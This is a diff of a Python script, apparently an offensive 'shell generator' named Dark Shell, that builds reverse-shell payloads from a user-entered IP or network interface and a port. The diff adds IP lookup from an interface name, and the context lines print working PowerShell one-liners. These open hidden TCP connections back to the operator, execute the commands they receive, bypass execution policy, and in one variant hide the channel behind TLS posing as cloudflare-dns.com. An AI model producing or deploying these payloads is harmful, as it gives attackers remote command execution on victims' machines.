@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 from colorit import *
 init_colorit()
-
+import socket
+import fcntl
+import struct
 import requests
 import sys
 from prompt_toolkit import prompt
@@ -11,6 +13,7 @@ PURPLE = 145,31,186
 DEEPPINK=255,20,147
 CYAN=0,238,238
 WHITE=255, 255, 255
+RED=255,0,0
 
 print(color("""
     _____             _           _____ _          _ _ 
@@ -20,7 +23,7 @@ print(color("""
     | |__| | (_| | |  |   <       ____) | | | |  __/ | |
     |_____/ \__,_|_|  |_|\_\     |_____/|_| |_|\___|_|_|     
 
-Drink Coffe, Enjoy Generate Shell                  by 0xPwn1                                                                                                 
+Drink Coffe, Enjoy Generate Shell                  by 0xPwn1 - V1.2                                                                                                 
 """,(PURPLE)))
 
 
@@ -50,7 +53,35 @@ completer1 = WordCompleter(PowerShell, ignore_case=True)
 completer2 = WordCompleter(Python, ignore_case=True)
 completer3 = WordCompleter(PHP, ignore_case=True)
 
-IP = input("[~] Enter Your IP: ")
+
+def get_ip_address(interface):
+    try:
+        # Check if the input is already an IP address
+        socket.inet_aton(interface)
+        return interface
+    except socket.error:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            ip_address = socket.inet_ntoa(fcntl.ioctl(
+                sock.fileno(),
+                0x8915,  # SIOCGIFADDR
+                struct.pack('256s', bytes(interface[:15], 'utf-8'))
+            )[20:24])
+            return ip_address
+        except IOError:
+            return None
+
+if __name__ == "__main__":
+    while True:
+        interface_name = input("Enter IP or Name-Interface: ")
+        ip_address = get_ip_address(interface_name)
+        if ip_address is not None:
+            IP = ip_address
+            break
+        else:
+            print(color("==> Incorrect Interface!!!", RED))
+
+
 PORT = input("[~] Enter Your PORT: ")
 FILE_NAME = input("[~] Enter Name File (Without Extension): ")
 #EXTENSION = input("Enter Your FORMAT: ").lower()
@@ -90,6 +121,8 @@ shell_commands = {
     "powershell-3": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"',
     "powershell-4": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT}); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient(\'cloudflare-dns.com\', $null, $false); if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close(); exit }} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }}; $StreamWriter.Write($String + \'SHELL> \'); $StreamWriter.Flush() }}; WriteToStream ''; while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }} WriteToStream ($Output) }} $StreamWriter.Close()"'
 }
+
+
 
 # CHOOSING VERSION LANGUAGE 
 if EXTENSION == "powershell":
